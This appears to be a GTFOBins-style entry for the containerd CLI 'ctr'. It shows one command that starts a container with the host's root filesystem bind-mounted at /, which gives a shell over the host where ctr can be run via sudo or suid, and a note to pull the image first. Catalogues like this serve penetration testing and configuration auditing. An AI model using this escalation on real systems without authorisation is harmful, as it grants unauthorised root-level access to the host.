---
type: gtfobin
name: ctr
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# ctr

## shell

```bash
ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x
```
_An image must be already present, for example:

```
ctr images pull docker.io/library/alpine:latest
```_
**Contexts:** sudo, suid
